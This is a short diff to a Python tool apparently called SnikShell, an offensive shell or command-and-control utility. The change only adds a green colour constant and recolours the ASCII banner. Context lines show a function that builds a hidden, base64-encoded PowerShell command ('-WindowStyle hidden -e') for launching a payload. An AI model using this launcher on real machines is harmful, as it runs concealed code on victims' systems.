@@ -2,6 +2,7 @@ import argparse, requests, base64, threading, flask, waitress, os, time
 
 BLUE = "\033[0;38;5;12m"
 ORANGE = "\033[0;38;5;214m"
+GREEN = "\033[0;38;5;10m"
 RED = "\033[1;31m"
 END = "\033[0m"
 BOLD = "\033[1m"
@@ -124,7 +125,7 @@ class SnikShell():
         return "powershell -WindowStyle hidden -e " + base64.b64encode(payload.encode("utf-16")[2:]).decode()
 
     def show_banner(self):
-        print(RED + """
+        print(GREEN + """
      
   ███████╗ ███╗   ██╗ ██╗ ██╗  ██╗   ███████╗ ██╗  ██╗ ███████╗ ██╗      ██╗     
   ██╔════╝ ████╗  ██║ ██║ ██║ ██╔╝   ██╔════╝ ██║  ██║ ██╔════╝ ██║      ██║     
